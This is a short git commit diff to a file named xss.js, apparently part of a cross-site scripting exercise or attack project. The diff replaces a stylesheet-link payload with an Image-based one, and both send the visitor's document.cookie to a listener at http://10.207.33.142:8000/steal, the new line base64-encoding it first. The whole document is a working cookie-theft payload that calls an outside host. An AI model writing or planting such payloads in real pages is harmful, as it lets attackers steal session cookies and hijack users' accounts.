0d746d62b696d99d6cf67319044bc911be59a0be
TrishaSrikanth-459 <73068694+TrishaSrikanth-459@users.noreply.github.com>
2026-02-26 20:19:30 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,1 @@
-var link = document.createElement('link');
-link.rel = 'stylesheet';
-link.href = 'http://10.207.33.142:8000/steal?cookie=' + document.cookie;
-document.head.appendChild(link);
+x = new Image(); x.src = 'http://10.207.33.142:8000/steal?cookie='+btoa(document.cookie);
